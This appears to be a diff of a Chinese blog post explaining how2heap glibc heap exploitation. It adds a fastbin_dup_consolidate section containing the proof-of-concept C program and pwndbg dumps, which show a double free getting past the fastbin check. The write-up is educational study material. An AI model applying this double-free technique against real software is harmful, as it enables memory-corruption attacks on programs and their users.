@@ -48,25 +48,25 @@ ptmalloc 中在分配过程中 引入了 fast bins【为了快速分配小的内
 
 ptmalloc 在给用户分配的空间的前后加上了一些控制信息，用这样的方法来记录分配的信息，以便完成分配和释放工作。
 
-##### (1)inuse chunk的格式
+##### (1)inuse chunk的格式及标志位PMA
 
 一个使用中的 chunk（使用中，就是指还没有被 free 掉）在内存中的样子【不同bins大同小异】如图所示： 
 
 ![firstfit1](/img/how2heap/fastbin_dup1.png)
 
-###### 标志位P
+**标志位P**
 
 chunk 的第二个域【size of chunk】的最低一位为 P，它表示前一个块是否在使用中，**P 为 0 则表示前一个 chunk 为空闲**，这时 chunk 的第一个域 prev_size 才有效，prev_size 表示前一个 chunk 的 size，程序可以使用这个值来找到前一个 chunk 的开始地址。当 P 为 1 时，表示前一个 chunk 正在使用中，prev_size无效，程序也就不可以得到前一个chunk的大小。不能对前一个chunk进行任何操作。**ptmalloc 分配的第一个块总是将 P 设为 1，以防止程序引用到不存在的区域。**
 
-###### 标志位M
+**标志位M**
 
 Chunk 的第二个域的倒数第二个位为 M，他表示当前 chunk 是从哪个内存区域获得的虚拟内存。M 为 1 表示该 chunk 是从 mmap 映射区域分配的【大概率这个chunk很大】，否则是从 heap 区域分配的。
 
-###### 标志位A
+**标志位A**
 
 Chunk 的第二个域倒数第三个位为 A，表示该 chunk 属于主分配区或者非主分配区，如果属于非主分配区，将该位置为 1，否则置为 0。 
 
-###### 注意
+**注意**
 
 由于32位是16B对齐，那么size的后三个bit肯定是000，故用作标志位。
 
@@ -159,8 +159,6 @@ glibc 检查代码:
 ```
 
 #### 3.回到正题——利用double free伪造一个栈上的chunk
-
-##### （1）debug
 
 和上一题类似，进行double free，此时fastbins中的0x20 bin为`[0x603000,0x603020,0x603000]`
 
@@ -262,6 +260,222 @@ glibc 检查代码:
 
 ## fastbin_dup_consolidate
 
+> 不知道为什么，网上的很多how2heap解析都跳过了这个
 
+前面`fastbin_dup`介绍了一个 fast double free 的绕过机制，通过在free 同一个 chunk中的中间插入对另外一个chunk 的free，即free(a)->free(b)->free(a)，从而实现double free。
+
+**而这里的思路是**：通过分配large bin来触发malloc_consolidate()【此时p1已经不在fastbin中】，而此时p1被放到unsorted bin，那么既然p1不在fast bin top自然就可以再次free，即绕过了double free。
+
+#### 1.malloc的分配过程
+
+推荐曾经写的[「堆漏洞」堆结构复习之malloc和free的过程]([https://spidermana.github.io/2019/04/19/%E5%A0%86%E7%AC%94%E8%AE%B0/](https://spidermana.github.io/2019/04/19/堆笔记/))
+
+以下简述一下：
+
+- H = （user malloc size + SIZE_SZ）align 2*SIZE_SZ
+- **fast bins中尝试分配【精确匹配】：**H<= max_fast (max_fast 默认为 64B)，则在fastbin中分配。fast bin中没有则下一步，到small bin中找
+- **small bins中尝试分配：【精确匹配】**H大小是否处在 small bins 中【即判断H < 512B是否成立】
+  - 找到则从该 bin 的尾部摘取一个**恰好满足大小**的 chunk。
+- **整合fast bins到unsorted bin：**遍历 fast bins 中的 chunk，将相邻的 chunk 进行合并， 并链接到 unsorted bin【malloc_consolidate】。
+- **unsorted bin中尝试分配：**如果 unsorted bin 只有一个 chunk，并且这个 chunk 在上次分配时被使用过。且H大小属于 small bins，并且 chunk 的大小>=H，这种情况下就直接将该 chunk 进行切割，分配结束。
+  - 否则整合unsorted bin中的chunk依据大小分别放到small bins或large bins中。
+  - 到了这一步，说明需要分配的是一块大的内存，或者 small bins 和 unsorted bin 中都找不到合适的 chunk，并且 <u>fast bins 和 unsorted bin 中所有的 chunk 都清除干净了</u>。
+- **在large bins中尝试分配：**按照最佳匹配算法分配，找一个合适的 chunk，切出H大小，并将剩下的部分链接回到 bins【根据大小放入small，large或是fast】
+  - 不需要精确匹配
+- **在top chunk中尝试分配：**判断 top chunk 大小是否满足所需 chunk 的大小，如果是，则从 top chunk 中分出H，完成，剩下的部分继续作为top chunk。
+  - 否则，如果是主分配区，调用 sbrk()，增加 top chunk 大小；如果是非主分配区，调用 mmap 来分配一个新的 sub-heap，增加 top chunk 大小；或者使用 mmap()来直接分配。
+- **H>mmap 分配阈值[128KB]：**直接用mmap分配，成为mmaped chunk【使用 mmap 系统调用为程序的内存空间映射一块H align 4kB 大小的空间】，完成。
+
+#### 2.large bin
+
+在 SIZE_SZ 为 4B 的平台上，大于等于 512B 的空闲 chunk，或者，**在 SIZE_SZ 为 8B 的平台上，大小大于等于 1024B =0x400的空闲 chunk**，由 sorted bins 管理。 
+
+Large bins 一共包括 63 个 bin，每个 bin 中的 chunk 大小不是一个固定公差的等差数列， 而是分成 6 组 bin，每组 bin 是一个固定公差的等差数列，每组的 bin 数量依次为 32、 16、 8、 4、 2、 1，公差依次为 64B、 512B、
+4096B、 32768B、 262144B 等。
+
+#### 3.small bin
+
+在 SIZE_SZ 为 4B 的平台上， small bins 中的 chunk 大小是以 8B 为公差的等差数列，最大
+的 chunk 大小为 504B，最小的 chunk 大小为 16B，所以实际共 62 个 bin。分别为 16B、 24B、32B，……， 504B。**在 SIZE_SZ 为 8B 的平台上**， small bins 中的 chunk 大小是以 16B 为公差的等差数列，最大的 chunk 大小为 1008B，最小的 chunk 大小为 32B，所以实际共 62 个 bin，分别为 **32B**、 48B、 64B，……， **1008B**。
+
+#### 4.解析源码+debug
+
+```c++
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+
+int main() {
+  void* p1 = malloc(0x40);
+  void* p2 = malloc(0x40);
+  fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);
+  fprintf(stderr, "Now free p1!\n");
+  free(p1);
+
+  void* p3 = malloc(0x400); //因此满足64位os下的large bin要求
+  fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
+  fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");
+  free(p1);
+  fprintf(stderr, "Trigger the double free vulnerability!\n");
+  fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
+  fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
+}
+```
+
+首先看代码，先申请了两个fastbin分别为p1和p2，此时bins均为空。
+
+```shell
+pwndbg> heap
+0x602000 FASTBIN {
+  prev_size = 0x0, 
+  size = 0x51, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x602050 FASTBIN {
+  prev_size = 0x0, 
+  size = 0x51, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x6020a0 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x20f61, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+```
+
+然后释放了一个p1，将其加入fastbins中【64bits平台下，fastbin最大的chunk为128B，所以0x50属于fastbin】。
+
+![con1](/img/how2heap/fastbin_dup_con1.png)
+
+再申请了一个0x400的largebin去触发漏洞【64bits的平台大于1024B=0x400B的chunk都属于largebin】，这是由于在申请largebin的时候会首先根据 chunk 的大小获得对应的 large bin 的 index。
+
+接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 malloc_consolidate() 函数，合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。【对于p1来说经历了：fast bin->unsorted bin->small bin】
+
+看看 large bin的分配
+
+```c++
+/*
+     If this is a large request, consolidate fastbins before continuing.
+     While it might look excessive to kill all fastbins before
+     even seeing if there is space available, this avoids
+     fragmentation problems normally associated with fastbins.
+     Also, in practice, programs tend to have runs of either small or
+     large requests, but less often mixtures, so consolidation is not
+     invoked all that often in most programs. And the programs that
+     it is called frequently in otherwise tend to fragment.
+   */
+
+  else
+    {
+      idx = largebin_index (nb);
+      if (have_fastchunks (av)) //如果由fastchunk就触发malloc_consolidate
+        malloc_consolidate (av);
+    }
+```
+
+malloc_consolidate() 函数的处理：
+
+- 这时候有fast bin 0x50：0x602000【p1】加入unsorted bin，加入的时候如果有相邻就会合并，否则只是简单插入unsorted bin。
+- 显然现在unsorted bin中唯一的chunk的大小还是不够0x400，因而触发整合unsorted bin中的chunk依据大小分别放到small bins或large bins中。
+- 这时会把0x602000【p1】整合到small bins。
+
+```c
+   10   free(p1);
+   11 
+   12   void* p3 = malloc(0x400);
+ ► 13   fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
+   14   fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");
+   15   free(p1);
+──────────────────────────────────────────────────────────────
+pwndbg> heap
+0x602000 FASTBIN {
+  prev_size = 0x0, 
+  size = 0x51, 
+  fd = 0x7ffff7dd1bb8 <main_arena+152>, 
+  bk = 0x7ffff7dd1bb8 <main_arena+152>, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x602050 {
+  prev_size = 0x50,  //此时物理相邻的chunk=0x602000已经free，因此P标志位为0【size字段改变】，由prev_size指示物理相邻的前一个chunk的size。【prev_size字段改变】
+  size = 0x50, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x6020a0 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x411, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x6024b0 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x20b51, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+pwndbg> bins
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+0x50: 0x7ffff7dd1bb8 (main_arena+152) —▸ 0x602000 ◂— 0x7ffff7dd1bb8  //可以看到p1=0x602000被整合到了small bins
+largebins
+empty
+pwndbg> 
+```
+
+这个时候我们就可以再次释放 p1，实现double free。（这是由于p1不是fast top，所以p1可以被释放）。
+
+```assembly
+   15   free(p1);
+ ► 16   fprintf(stderr, "Trigger the double free vulnerability!\n");
+   17   fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
+   18   fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
+   19 }
+──────────────────────────────────────────────────────────────
+pwndbg> bins
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x602000 ◂— 0x0
+0x60: 0x0
+#但是我不知道为什么在terminal的时候可以正常运行，而pwndbg的时候不行【并且看不到两个bins都有0x602000】，可能会由一些pwndbg提供的内存检测机制
+#pwndbg输出
+pwndbg> n
+Trigger the double free vulnerability!
+#terminal输出
+$ ./fastbin_dup_consolidate 
+Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x17ee010 0x17ee010
+```
+
+这个时候，我们既有fastbins中的 chunk p1 也有small bins 的chunk p1。
+
+我们可以malloc两次，第一次从fastbins取出，第二次从small bins中取出【从前面malloc的过程可知，先尝试在fast bin中分配，再尝试从small bin中分配，因此依次取出"两个"p1】，且这两块新 chunk 处于同一个位置。
 
 ## unsafe_unlink
+
+> 重头戏！来了！准备绕晕！
